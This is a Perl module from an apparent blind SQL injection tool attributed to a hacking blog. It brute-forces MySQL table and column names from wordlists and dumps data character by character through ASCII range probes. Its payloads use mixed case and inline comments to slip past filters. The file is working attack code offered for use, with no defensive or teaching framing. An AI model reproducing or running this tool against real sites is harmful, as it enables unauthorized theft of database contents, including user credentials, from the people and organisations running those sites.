#!/usr/local/bin/perl

#-----------------------------------------------------------------------------------------#
# Injection tool by VOİXSEC.BLOGSPOT.COM
# Code version: 2.0
# Function file: Get about by web, Get tables&columns, Dump data (Blind injection)
#-----------------------------------------------------------------------------------------#

@tables =  &get_list("brute/","tables.txt");
@column =  &get_list("brute/","columns.txt");

sub blind_MySQL_foundTable()
{
	$table = $_[0];
	$table =~ s/[\r\n]/ /g;
		
	if( &same2Normal($normal, $target."+/**/AnD+/**/(SeLeCt+/**/1+/**/FRoM+/**/".$table."+/**/LiMiT+/**/0,+/**/1+/**/)+/**/=1".$comment) )
	{
		return 1;
	}	

}

sub blind_MySQL_foundColumn()
{
	$table_name = $_[0];
	
	$column = $_[1];
	$column =~ s/[\r\n]/ /g;

	if( &same2Normal($normal, $target."+AnD/**/+(+/**/SeLeCt+SuBsTrINg(CoNcAt(+/**/1+/**/,/**/".$column."),1,1)/**/+/**/FrOm/**/+".$table_name."+LiMiT+/**/0,+/**/1+/**/)+/**/=1".$comment) )
	{
		return 1;
	}	

}

sub blind_MySQL_char()
{
	$bet = 30;
	$sub = $_[3];
	
	$inject = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$_[0].")FROM+".$_[1]."+LIMIT+".$_[2].",1),".$sub.",1))BETWEEN+".$bet."+AND+".($bet+10);
	
	while(!(&same2Normal($normal, $target.$inject)) && $bet < 130)
	{
		$bet += 10;
		$inject = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$_[0].")FROM+".$_[1]."+LIMIT+".$_[2].",1),".$sub.",1))BETWEEN+".$bet."+AND+".($bet+10);
	}
	
	$last = ($bet+10);
	$inject = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$_[0].")FROM+".$_[1]."+LIMIT+".$_[2].",1),".$sub.",1))=".$bet; 
		
	while(!(&same2Normal($normal, $target.$inject)) && $bet < $last)
	{
		$bet += 1;
		$inject = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$_[0].")FROM+".$_[1]."+LIMIT+".$_[2].",1),".$sub.",1))=".$bet; 
	}
	
	if(&same2Normal($normal, $target.$inject))
	{
		return $bet;
	}
	
}

1;
